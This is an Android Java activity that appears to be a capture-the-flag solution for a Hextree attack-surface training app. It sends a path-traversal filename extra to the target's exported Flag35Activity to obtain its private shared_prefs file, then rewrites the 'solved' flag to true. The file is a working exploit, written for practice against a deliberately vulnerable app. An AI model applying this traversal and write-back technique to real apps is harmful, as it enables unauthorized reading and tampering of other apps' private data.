package com.hextree.getflag;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.*;

public class ContentProviderFlag36 extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable @org.jetbrains.annotations.Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"));
        intent.putExtra("filename", "/../shared_prefs/Flag36Preferences.xml");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent data) {
        Utils.showDialog(this, data);
        try {
            InputStream inputStream = getContentResolver().openInputStream(data.getData());
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            String line;
            StringBuilder content = new StringBuilder();
            while ((line = reader.readLine()) != null){
                if (line.contains("<boolean name=\"solved\"")) {
                    if (line.contains("value=\"true\"")){
                        Toast.makeText(this, "Already Solved", Toast.LENGTH_SHORT).show();
                    } else {
                        Log.d("File", " [*] " + line);
                        line = line.replace("value=\"false\"", "value=\"true\"");
                    }
                }
                content.append(line).append("\n");
            }
            OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));

            writer.write(content.toString());
            writer.flush();
            reader.close();
            writer.close();
        } catch (IOException e) {
            Log.d("Error", e.toString());
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
